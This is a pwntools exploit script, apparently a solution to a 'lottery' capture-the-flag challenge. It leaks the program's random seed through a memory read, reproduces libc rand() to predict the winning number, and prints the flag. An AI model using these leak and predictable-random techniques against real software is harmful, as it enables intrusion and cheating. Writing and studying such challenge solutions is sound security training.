#!/usr/bin/python3
from pwn import *
from ctypes import CDLL
import sys

HOST, PORT = "127.0.0.1", 5003

libc = CDLL("libc.so.6")
elf = ELF("../challenge/lottery")

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(elf.path)

p.sendlineafter(">>> ", "1")
p.sendlineafter(": ", "18")
p.sendlineafter(": ", "male")
p.sendlineafter(": ", "hfz")

p.sendlineafter(">>> ", "4")

p.sendlineafter(">>> ", "2")
p.sendlineafter(": ", str(elf.sym["seed"]))

p.sendlineafter(">>> ", "3")
p.recvuntil(". ")

seed = u32(p.recvuntil(",", drop=True).strip().ljust(4, b"\x00"))
p.info(f"Got seed: {seed}")

libc.srand(seed)
for _ in range(2): guess = libc.rand()

p.sendlineafter(">>> ", "2")
p.sendlineafter(": ", str(guess))
flag = p.recvline().decode()

p.success(f"Flag: {flag}")
